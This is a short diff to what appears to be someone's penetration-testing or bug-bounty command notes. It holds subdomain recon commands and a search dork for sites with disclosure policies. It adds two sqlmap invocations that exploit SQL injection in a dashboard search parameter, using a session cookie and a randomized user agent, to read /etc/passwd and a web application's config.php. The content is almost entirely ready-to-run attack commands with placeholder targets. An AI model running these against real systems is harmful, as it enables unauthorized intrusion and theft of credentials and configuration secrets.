@@ -15,3 +15,18 @@
 ``` subfinder -d X | /home/kali/go/bin/httpx -u -status-code -title -tech-detect -follow-redirects -timeout 5 ```
 
 ``` site:*.com.ar "bug bounty" OR "vulnerability disclosure" OR "security policy" ```
+
+```
+sqlmap -u "http://X/dashboard/dashboard.php" \
+--data "search=34" \
+--cookie "PHPSESSID=X" \
+--batch --random-agent \
+--file-read="/etc/passwd"
+```
+```
+sqlmap -u "http://X/dashboard/dashboard.php" \
+--data "search=34" \
+--cookie "PHPSESSID=X" \
+--batch --random-agent \
+--file-read="/var/www/html/config.php"
+```
